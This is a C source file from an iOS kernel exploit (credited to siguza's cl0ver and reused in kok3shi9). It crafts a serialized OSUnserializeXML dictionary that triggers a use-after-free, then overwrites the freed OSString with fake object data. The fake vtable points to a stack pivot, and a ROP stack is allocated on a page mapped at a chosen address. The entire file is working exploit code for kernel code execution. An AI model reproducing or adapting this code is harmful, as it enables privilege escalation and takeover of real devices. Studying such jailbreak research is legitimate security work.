// siguza's cl0ver
// this file was also used kok3shi9

#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/vm_prot.h>

#include <common.h>
#include <io.h>
#include <kslide.h>
#include <plog.h>
#include <offsets.h>
#include <uaf.h>

void uaf_parse(const OSString *fake)
{
    DEVLOG("Using UAF to gain PC control...");
    
    const uint32_t *data = (const uint32_t*)fake;
    
    const char str[] = "str";
    const char ref[] = "ref";
    
    uint32_t dict[] =
    {
        kOSSerializeMagic,                                          // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries
        
        kOSSerializeSymbol | 4,                                     // Just a name
        *((uint32_t*)str),
        kOSSerializeString | 4,                                     // String that will get freed
        *((uint32_t*)str),
        
        kOSSerializeObject | 1,                                     // Same name
        kOSSerializeBoolean | 1,                                    // Lightweight value
        
        kOSSerializeObject | 1,                                     // Same name again
        kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
        
        data[0],                                                    // vtable pointer (lower half)
        data[1],                                                    // vtable pointer (upper half)
        data[2],                                                    // retainCount
        data[3],                                                    // flags
        data[4],                                                    // length
        data[5],                                                    // (padding)
        data[6],                                                    // string pointer (lower half)
        data[7],                                                    // string pointer (upper half)
        
        kOSSerializeSymbol | 4,                                     // Whatever name for our reference
        *((uint32_t*)ref),
        kOSSerializeEndCollection | kOSSerializeObject | 2,         // Reference to object 1 (OSString)
    };
    dict_parse(dict, sizeof(dict));
}

// Don't risk deallocating this once we acquire it
addr_t* uaf_rop_stack(void)
{
    static addr_t *ptr = NULL;
    if(ptr == NULL)
    {
        kern_return_t ret;
        vm_size_t page_size = 0;
        host_page_size(mach_host_self(), &page_size);
        DEVLOG("Page size: " SIZE, (size_t)page_size);
        
        vm_address_t addr = kOSSerializeObject; // dark magic
        
        DEVLOG("Allocating ROP stack page at " ADDR, (addr_t)addr);
        ret = vm_allocate(mach_task_self(), &addr, page_size, 0);
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to allocate page at " ADDR " (%s)", (addr_t)addr, mach_error_string(ret));
            return 0;
        }
        DEVLOG("Allocated ROP page at " ADDR, (addr_t)addr);
        ptr = (addr_t*)addr;
    }
    return ptr;
}

void uaf_rop(void)
{
    DEVLOG("Executing ROP chain...");
    usleep(10000); // In case we panic...
    
    addr_t vtab[] =
    {
        0x0,
        0x0,
        0x0,
        0x0,
        get_stack_pivot(),
    };
    OSString osstr =
    {
        .vtab = (vtab_t)vtab,
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0,
        .string = NULL,
    };
    
    uaf_parse(&osstr);
}
